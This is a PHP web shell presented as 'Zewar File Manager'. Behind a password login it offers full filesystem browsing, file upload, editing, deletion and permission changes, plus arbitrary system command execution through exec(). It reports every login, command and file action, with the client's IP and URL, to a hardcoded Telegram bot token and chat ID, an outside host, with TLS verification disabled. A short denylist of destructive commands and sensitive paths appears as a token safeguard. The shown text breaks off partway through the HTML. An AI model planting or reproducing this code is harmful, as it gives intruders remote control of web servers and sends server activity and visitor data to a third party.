<?php
// ============================================================
// Basic Configuration - Stable Version
// ============================================================
error_reporting(E_ALL);
@ini_set("display_errors", 1);
@ini_set("memory_limit", "256M");
@ini_set("max_execution_time", 300);
@ini_set("upload_max_filesize", "100M");
@ini_set("post_max_size", "100M");

// Security Headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

// Session Security
@session_start();
@ini_set('session.cookie_httponly', 1);

// ============================================================
// Configuration
// ============================================================
$CONFIG = [
    'username' => 'alfa',
    'password' => '9dc7b2518d5494e6eb20769721015fee',
    'session_timeout' => 3600,
];

// ============================================================
// TELEGRAM CONFIGURATION
// ============================================================
$TELEGRAM_CONFIG = [
    'bot_token' => '8761894826:AAHLx1uW3V7liU4Q-rv1bk-9mCN2T1UGN3U',
    'chat_id' => '2096023362'
];

// ============================================================
// Helper Functions
// ============================================================
function get_current_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $protocol . $host . ($_SERVER['REQUEST_URI'] ?? '');
}

function get_client_ip() {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    return $ip;
}

// ============================================================
// Security Functions
// ============================================================
function sanitize_path($path) {
    if (empty($path)) return false;
    $path = str_replace(chr(0), '', $path);
    $realPath = realpath($path);
    if ($realPath === false) {
        $realPath = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
        $realPath = preg_replace('/[\/\\\]+/', DIRECTORY_SEPARATOR, $realPath);
    }
    
    $forbidden = array('/etc/shadow', '/etc/passwd', '/etc/sudoers', '/root/', '/boot/');
    foreach ($forbidden as $dir) {
        if (strpos($realPath, $dir) === 0 && strlen($dir) > 1) {
            return false;
        }
    }
    return $realPath;
}

function sanitize_filename($filename) {
    $filename = str_replace(array('..', './', '.\\'), '', $filename);
    $filename = preg_replace('/[\\x00-\\x1F\\x7F\\/\\\\:\\*\\?"<>\\|]/', '_', $filename);
    return trim($filename);
}

function sanitize_command($cmd) {
    $critical_dangerous = array(
        'rm -rf /', 'rm -rf /*', 'mkfs', 'dd if=', ':(){ :|:& };:',
        'chmod 777 /', 'chmod -R 777 /', '> /dev/sda', 'dd of=/dev/sda'
    );
    
    $cmd_lower = strtolower($cmd);
    foreach ($critical_dangerous as $danger) {
        if (strpos($cmd_lower, $danger) !== false) {
            return false;
        }
    }
    return $cmd;
}

function csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verify_csrf_token($token) {
    return !empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
function send_telegram($action, $details = array()) {
    global $TELEGRAM_CONFIG;
    
    $botToken = $TELEGRAM_CONFIG['bot_token'];
    $chatId = $TELEGRAM_CONFIG['chat_id'];
    
    if (empty($botToken) || empty($chatId)) {
        return false;
    }
    
    $ip = get_client_ip();
    $url = get_current_url();
    $time = date('Y-m-d H:i:s');
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    $icons = array(
        'LOGIN' => '✅ LOGIN SUCCESS',
        'LOGIN_FAILED' => '❌ LOGIN FAILED',
        'UPLOAD' => '📤 UPLOAD',
        'UPLOAD_FAILED' => '❌ UPLOAD FAILED',
        'FOLDER' => '📁 CREATE FOLDER',
        'FILE' => '📄 CREATE FILE',
        'DELETE' => '🗑️ DELETE',
        'RENAME' => '✏️ RENAME',
        'CHMOD' => '🔒 CHMOD',
        'SAVE' => '💾 SAVE FILE',
        'CMD' => '💻 COMMAND',
        'DOWNLOAD' => '📥 DOWNLOAD',
        'LOGOUT' => '🚪 LOGOUT'
    );
    
    $display_action = isset($icons[$action]) ? $icons[$action] : $action;
    
    $msg = "🔐 FILE MANAGER ACTIVITY\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "👤 User: Administrator\n";
    $msg .= "⏰ Time: {$time}\n";
    $msg .= "📌 Action: {$display_action}\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= "🌍 Domain: {$domain}\n";
    $msg .= str_repeat("━", 50) . "\n";
    $msg .= "🔗 URL: {$url}\n";
    
    if (!empty($details)) {
        $msg .= str_repeat("━", 50) . "\n";
        $msg .= "📝 Details:\n";
        foreach ($details as $key => $val) {
            $msg .= "• {$key}: " . substr($val, 0, 200) . "\n";
        }
    }
    
    $msg .= str_repeat("━", 50);
    
    if (function_exists('curl_init')) {
        $api_url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $postData = http_build_query(array(
            'chat_id' => $chatId,
            'text' => $msg,
            'disable_web_page_preview' => true
        ));
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($ch);
        curl_close($ch);
    }
    
    return true;
}

// ============================================================
// File Functions
// ============================================================
function format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 1) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 1) . ' KB';
    return $bytes . ' B';
}

function get_file_icon($filename) {
    if (is_dir($filename)) return '📁';
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'zip' => '📦',
        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'xls' => '📗'
    );
    return isset($icons[$ext]) ? $icons[$ext] : '📄';
}

function delete_recursive($path) {
    if (!file_exists($path)) return true;
    if (!is_dir($path)) return @unlink($path);
    
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        if (!delete_recursive($path . DIRECTORY_SEPARATOR . $file)) return false;
    }
    return @rmdir($path);
}

// ============================================================
// Authentication
// ============================================================
$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$authenticated) {
    if (md5(trim($_POST['password'])) === $CONFIG['password']) {
        session_regenerate_id(true);
        $_SESSION['auth'] = true;
        $_SESSION['login_time'] = time();
        $authenticated = true;
        send_telegram('LOGIN', array('Status' => 'Success'));
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    } else {
        send_telegram('LOGIN_FAILED', array('IP' => get_client_ip()));
        $error = "Invalid credentials!";
        echo get_login_page($error);
        exit;
    }
}

if ($authenticated && (time() - $_SESSION['login_time'] > $CONFIG['session_timeout'])) {
    session_destroy();
    $authenticated = false;
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!$authenticated) {
    echo get_login_page();
    exit;
}

// ============================================================
// Path Handling
// ============================================================
$document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root;
$current = sanitize_path($current);

if (!$current || !is_dir($current)) {
    $current = $document_root;
}

@chdir($current);
$parent_dir = dirname($current);
$can_go_up = ($parent_dir !== $current && $parent_dir !== false && $parent_dir !== '');

// ============================================================
// Process Actions
// ============================================================
$message = '';
$toast_type = '';

// AJAX Command Handler
if (isset($_GET['ajax_cmd']) && isset($_POST['command'])) {
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    header('Content-Type: application/json');
    
    $response = array('status' => 'error', 'output' => 'Unknown error occurred');
    
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        $response['output'] = 'CSRF validation failed';
        echo json_encode($response);
        exit;
    }
    
    $cmd = $_POST['command'] ?? '';
    $original_cmd = $cmd;
    $cmd = sanitize_command($cmd);
    
    if ($cmd === false) {
        send_telegram('⚠️ COMMAND BLOCKED', array(
            'Command' => substr($original_cmd, 0, 200),
            'Reason' => 'Critical dangerous command blocked'
        ));
        $response['output'] = '⚠️ Command blocked for security reasons.';
        echo json_encode($response);
        exit;
    }
    
    $output = array();
    $return_var = 0;
    exec($cmd . ' 2>&1', $output, $return_var);
    $result = implode("\n", $output);
    
    if (empty($result) && $return_var === 0) {
        $result = '✓ Command executed successfully (no output)';
    } elseif ($return_var !== 0 && empty($result)) {
        $result = '⚠️ Command failed with exit code: ' . $return_var;
    }
    
    send_telegram('CMD', array(
        'Command' => substr($cmd, 0, 200),
        'Status' => $return_var === 0 ? 'Success' : 'Failed'
    ));
    
    $response = array(
        'status' => $return_var === 0 ? 'success' : 'error',
        'output' => $result,
        'command' => $cmd
    );
    
    echo json_encode($response);
    exit;
}

// Handle Edit File Request (GET)
if (isset($_GET['edit']) && !empty($_GET['edit'])) {
    $filename = sanitize_filename(base64_decode($_GET['edit']));
    if ($filename && file_exists($current . '/' . $filename) && is_file($current . '/' . $filename)) {
        $filepath = $current . '/' . $filename;
        $content = file_get_contents($filepath);
        $is_writable = is_writable($filepath);
        
        echo '<!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Edit File</title>
            <style>
                body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #fff; }
                .container { max-width: 1200px; margin: auto; }
                textarea { width: 100%; height: 500px; background: #0a0a0a; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; }
                button { padding: 10px 20px; margin: 10px 5px; cursor: pointer; }
                .btn-save { background: #4caf50; color: white; border: none; }
                .btn-cancel { background: #f44336; color: white; border: none; }
            </style>
        </head>
        <body>
        <div class="container">
            <h2>Edit File: ' . htmlspecialchars($filename) . '</h2>
            <form method="post" action="?">
                <input type="hidden" name="csrf_token" value="' . csrf_token() . '">
                <input type="hidden" name="save_file_action" value="1">
                <input type="hidden" name="edit_filename" value="' . base64_encode($filename) . '">
                <input type="hidden" name="current_dir" value="' . base64_encode($current) . '">
                <textarea name="file_content">' . htmlspecialchars($content) . '</textarea>
                <div>
                    <button type="submit" name="save_file_btn" class="btn-save">Save Changes</button>
                    <button type="button" class="btn-cancel" onclick="window.location.href=\'?d=' . base64_encode($current) . '\'">Cancel</button>
                </div>
            </form>
        </div>
        </body>
        </html>';
        exit;
    } else {
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
}

// POST Actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && verify_csrf_token($_POST['csrf_token'])) {
    
    // Save File from Edit Form
    if (isset($_POST['save_file_action']) && isset($_POST['save_file_btn'])) {
        $filename = base64_decode($_POST['edit_filename'] ?? '');
        $filename = sanitize_filename($filename);
        $current_dir = base64_decode($_POST['current_dir'] ?? '');
        $current_dir = sanitize_path($current_dir);
        
        if ($filename && $current_dir && file_exists($current_dir . '/' . $filename)) {
            $filepath = $current_dir . '/' . $filename;
            $content = $_POST['file_content'] ?? '';
            
            if (file_put_contents($filepath, $content) !== false) {
                $message = "✅ File saved successfully: {$filename}";
                $toast_type = 'success';
                send_telegram('SAVE', array('File' => $filename));
            } else {
                $message = "❌ Failed to save file: {$filename}";
                $toast_type = 'error';
            }
        } else {
            $message = "❌ File not found!";
            $toast_type = 'error';
        }
        
        header("Location: ?d=" . base64_encode($current_dir));
        exit;
    }
    
    // Upload File
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $filename = sanitize_filename($_FILES['file']['name']);
        if ($filename && move_uploaded_file($_FILES['file']['tmp_name'], $current . '/' . $filename)) {
            @chmod($current . '/' . $filename, 0644);
            $message = "✅ Uploaded: {$filename}";
            $toast_type = 'success';
            send_telegram('UPLOAD', array('File' => $filename, 'Size' => format_size($_FILES['file']['size'])));
        } else {
            $message = "❌ Upload failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create Folder
    elseif (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $name = sanitize_filename($_POST['folder_name']);
        if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
            $message = "✅ Folder created: {$name}";
            $toast_type = 'success';
            send_telegram('FOLDER', array('Name' => $name));
        } else {
            $message = "❌ Cannot create folder!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create File
    elseif (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $name = sanitize_filename($_POST['file_name']);
        if ($name && !file_exists($current . '/' . $name) && file_put_contents($current . '/' . $name, $_POST['file_content'] ?? '') !== false) {
            @chmod($current . '/' . $name, 0644);
            $message = "✅ File created: {$name}";
            $toast_type = 'success';
            send_telegram('FILE', array('Name' => $name));
        } else {
            $message = "❌ Cannot create file!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Delete
    elseif (isset($_POST['delete']) && !empty($_POST['item'])) {
        $name = sanitize_filename($_POST['item']);
        $path = $current . '/' . $name;
        $is_dir = is_dir($path);
        if (file_exists($path) && delete_recursive($path)) {
            $message = "✅ Deleted: {$name}";
            $toast_type = 'success';
            send_telegram('DELETE', array('Name' => $name, 'Type' => $is_dir ? 'Folder' : 'File'));
        } else {
            $message = "❌ Delete failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Rename
    elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $old = sanitize_filename($_POST['old_name']);
        $new = sanitize_filename($_POST['new_name']);
        if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
            $message = "✅ Renamed: {$old} → {$new}";
            $toast_type = 'success';
            send_telegram('RENAME', array('From' => $old, 'To' => $new));
        } else {
            $message = "❌ Rename failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Chmod
    elseif (isset($_POST['chmod']) && !empty($_POST['item']) && !empty($_POST['permission'])) {
        $name = sanitize_filename($_POST['item']);
        $perm = $_POST['permission'];
        if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
            $message = "✅ Permission changed to {$perm}";
            $toast_type = 'success';
            send_telegram('CHMOD', array('File' => $name, 'Permission' => $perm));
        } else {
            $message = "❌ Chmod failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Logout
    elseif (isset($_POST['logout'])) {
        send_telegram('LOGOUT', array());
        session_destroy();
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    }
}

// Handle download
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = base64_decode($_GET['download']);
    $file = sanitize_path($file);
    
    if ($file && file_exists($file) && is_file($file)) {
        $filename = $_GET['filename'] ?? basename($file);
        send_telegram('DOWNLOAD', array('File' => $filename));
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        readfile($file);
        exit;
    } else {
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
}

// ============================================================
// Directory Listing
// ============================================================
$items = array();
$handle = @opendir($current);
if ($handle) {
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $full = $current . '/' . $item;
        $is_dir = is_dir($full);
        $stat = stat($full);
        $size = $is_dir ? '-' : format_size($stat['size']);
        $perms = substr(sprintf('%o', $stat['mode']), -4);
        $mtime = date('Y-m-d H:i:s', $stat['mtime']);
        
        $items[] = array(
            'name' => $item,
            'is_dir' => $is_dir,
            'size' => $size,
            'perms' => $perms,
            'mtime' => $mtime,
            'icon' => get_file_icon($item),
            'link' => $is_dir ? '?d=' . base64_encode($full) : '#'
        );
    }
    closedir($handle);
}

usort($items, function($a, $b) {
    if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

$display_path = $current;
if (DIRECTORY_SEPARATOR == '\\') {
    $display_path = str_replace('\\', '/', $current);
}
$path_parts = explode(DIRECTORY_SEPARATOR, $display_path);
$path_parts = array_filter($path_parts);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zewar File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #0a0a0a;
            color: #fff;
            padding: 15px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #1a1a2e;
            border-radius: 10px;
            overflow: hidden;
        }
        .header {
            padding: 15px 20px;
            background: #16213e;
            border-bottom: 1px solid #ffd700;
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo h1 { font-size: 1.3rem; color: #ffd700; }
        .logo p { font-size: 0.7rem; color: #aaa; }
        .stats { display: flex; gap: 15px; }
        .stat { text-align: center; padding: 5px 12px; background: #0f3460; border-radius: 5px; }
        .stat-value { font-size: 1rem; font-weight: bold; color: #ffd700; }
        .stat-label { font-size: 0.6rem; color: #aaa; }
        .toolbar {
            padding: 12px 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            background: #0f3460;
        }
        .btn {
            padding: 6px 14px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 0.8rem;
            text-decoration: none;
        }
        .btn-primary { background: #ffd700; color: #000; }
        .btn-primary:hover { background: #ffed4a; }
        .btn-danger { background: #dc3545; color: #fff; }
        .btn-danger:hover { background: #c82333; }
        .btn-outline { background: transparent; border: 1px solid #ffd700; color: #ffd700; }
        .btn-outline:hover { background: rgba(255,215,0,0.1); }
        .btn-up { background: #28a745; color: #fff; }
        .btn-root { background: #17a2b8; color: #fff; }
        .breadcrumb {
            padding: 10px 15px;
            background: #0f3460;
            font-size: 0.75rem;
        }
        .breadcrumb a { color: #ffd700; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .separator { margin: 0 3px; color: #aaa; }
        .file-table { overflow-x: auto; }
        .file-table table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px 12px; text-align: left; background: #16213e; color: #ffd700; font-weight: 600; font-size: 0.75rem; }
        .file-table td { padding: 8px 12px; border-bottom: 1px solid #0f3460; font-size: 0.75rem; }
        .file-table tr:hover td { background: #0f3460; }
        .item-name { display: flex; align-items: center; gap: 8px; }
        .item-icon { font-size: 1.1rem; }
        .item-link { color: #fff; text-decoration: none; }
        .item-link:hover { color: #ffd700; }
        .action-group { display: flex; gap: 5px; flex-wrap: wrap; }
        .action-btn {
            background: #0f3460;
            border: none;
            padding: 3px 8px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.65rem;
            color: #fff;
            transition: all 0.2s;
        }
        .action-btn:hover { background: #ffd700; color: #000; }
        .badge { display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: #0f3460; color: #ffd700; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1a1a2e;
            border-radius: 10px;
            width: 90%;
            max-width: 500px;
            border: 1px solid #ffd700;
        }
        .modal-header {
            padding: 15px 20px;
            background: #16213e;
            border-bottom: 1px solid #ffd700;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h3 { color: #ffd700; }
        .modal-close {
            background: none;
            border: none;
            color: #fff;
            font-size: 1.5rem;
            cursor: pointer;
        }
        .modal-body { padding: 20px; }
        .modal-body input, .modal-body textarea {
            width: 100%;
            padding: 8px 12px;
            background: #0a0a0a;
            border: 1px solid #ffd700;
            border-radius: 5px;
            color: #fff;
            margin-top: 5px;
        }
        .modal-body textarea { min-height: 100px; font-family: monospace; }
        .modal-body label { display: block; margin-bottom: 15px; color: #ffd700; }
        .modal-footer {
            padding: 15px 20px;
            background: #16213e;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 12px 20px;
            border-radius: 5px;
            color: #fff;
            z-index: 2000;
            animation: slideIn 0.3s ease;
        }
        .toast.success { background: #28a745; }
        .toast.error { background: #dc3545; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .command-panel {
            background: #0a0a0a;
            border-top: 1px solid #ffd700;
            padding: 10px 15px;
        }
        .command-input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .command-input-group input {
            flex: 1;
            padding: 8px 12px;
            background: #000;
            border: 1px solid #ffd700;
            border-radius: 5px;
            color: #0f0;
            font-family: monospace;
        }
        .command-output {
            margin-top: 8px;
            background: #000;
            border-radius: 5px;
            padding: 8px 12px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #0f0;
            max-height: 150px;
            overflow-y: auto;
            display: none;
            white-space: pre-wrap;
        }
        .command-output.active { display: block; }
        @media (max-width: 768px) {
            .toolbar { justify-content: center; }
            .stats { display: none; }
            .action-group { flex-wrap: wrap; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <h1>📁 Zewar File Manager</h1>
                <p>Advanced Web File Management System</p>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-value"><?php echo count($items); ?></div><div class="stat-label">Items</div></div>
                <div class="stat"><div class="stat-value"><?php echo date('H:i:s'); ?></div><div class="stat-label">Server Time</div></div>
            </div>
        </div>
    </div>
    
    <div class="toolbar">
        <button class="btn btn-primary" onclick="showModal('uploadModal')">📤 Upload</button>
        <button class="btn btn-primary" onclick="showModal('folderModal')">📁 New Folder</button>
        <button class="btn btn-primary" onclick="showModal('fileModal')">📄 New File</button>
        <form method="post" style="display: inline;">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <button type="submit" name="logout" class="btn btn-danger">🚪 Logout</button>
        </form>
        <?php if ($can_go_up): ?>
        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up">⬆ Parent Directory</a>
        <?php endif; ?>
        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root">🏠 Document Root</a>
    </div>
    
    <div class="breadcrumb">
        📂 
        <?php 
        $breadcrumb_path = '';
        foreach ($path_parts as $index => $part):
            $breadcrumb_path .= ($index > 0 ? '/' : '') . $part;
            $encoded = base64_encode($breadcrumb_path);
            echo '<a href="?d=' . $encoded . '">' . htmlspecialchars($part) . '</a>';
            if ($index < count($path_parts) - 1) echo '<span class="separator">/</span>';
        endforeach;
        ?>
    </div>
    
    <div class="file-table">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($items)): ?>
                <tr><td colspan="5" style="text-align: center; padding: 40px;">📂 Directory is empty</td></tr>
                <?php else: ?>
                <?php foreach ($items as $item): ?>
                <tr>
                    <td class="item-name">
                        <span class="item-icon"><?php echo $item['icon']; ?></span>
                        <?php if ($item['is_dir']): ?>
                            <a href="<?php echo $item['link']; ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php else: ?>
                            <span><?php echo htmlspecialchars($item['name']); ?></span>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $item['size']; ?></td>
                    <td><span class="badge"><?php echo $item['perms']; ?></span></td>
                    <td><?php echo $item['mtime']; ?></td>
                    <td class="action-group">
                        <?php if (!$item['is_dir']): ?>
                            <button class="action-btn" onclick="editFile('<?php echo base64_encode($item['name']); ?>')">✏ Edit</button>
                            <button class="action-btn" onclick="downloadFile('<?php echo base64_encode($current . '/' . $item['name']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')">📥 Download</button>
                        <?php endif; ?>
                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')">✏ Rename</button>
                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">🔒 Chmod</button>
                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')">🗑 Delete</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
    
    <div class="command-panel">
        <div class="command-input-group">
            <span>💻</span>
            <input type="text" id="cmd_input" placeholder="Execute system command (ls, pwd, whoami, etc.)" onkeypress="if(event.key==='Enter') executeCommand()">
            <button class="btn btn-outline" onclick="executeCommand()">▶ Run</button>
        </div>
        <div id="cmd_output" class="command-output"></div>
    </div>
</div>

<!-- Modal Upload -->
<div id="uploadModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>📤 Upload File</h3>
            <button class="modal-close" onclick="closeModal('uploadModal')">&times;</button>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label>Select File:
                    <input type="file" name="file" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button>
                <button type="submit" class="btn btn-primary">Upload</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Create Folder -->
<div id="folderModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>📁 Create New Folder</h3>
            <button class="modal-close" onclick="closeModal('folderModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label>Folder Name:
                    <input type="text" name="folder_name" placeholder="my_new_folder" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button>
                <button type="submit" name="create_folder" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Create File -->
<div id="fileModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>📄 Create New File</h3>
            <button class="modal-close" onclick="closeModal('fileModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <div class="modal-body">
                <label>File Name:
                    <input type="text" name="file_name" placeholder="index.php" required>
                </label>
                <label>File Content (optional):
                    <textarea name="file_content" placeholder="Write your content here..."></textarea>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button>
                <button type="submit" name="create_file" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Rename -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>✏ Rename Item</h3>
            <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="old_name" id="rename_old">
            <div class="modal-body">
                <label>Current Name:
                    <input type="text" id="rename_current" disabled style="opacity:0.7">
                </label>
                <label>New Name:
                    <input type="text" name="new_name" id="rename_new" required>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button>
                <button type="submit" name="rename" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Chmod -->
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>🔒 Change Permissions</h3>
            <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
        </div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <input type="hidden" name="item" id="chmod_item">
            <div class="modal-body">
                <label>File/Folder:
                    <input type="text" id="chmod_filename" disabled style="opacity:0.7">
                </label>
                <label>Permissions (Octal):
                    <input type="text" name="permission" id="chmod_perm" placeholder="0755" maxlength="4" required>
                </label>
                <div style="font-size:0.7rem; color:#aaa; margin-top:10px;">
                    <strong>Common permissions:</strong><br>
                    0644 = Owner: read/write, Group: read, Others: read (files)<br>
                    0755 = Owner: read/write/execute, Group: read/execute, Others: read/execute (folders)
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button>
                <button type="submit" name="chmod" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal Delete Confirm -->
<div id="deleteModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>⚠ Confirm Delete</h3>
            <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
        </div>
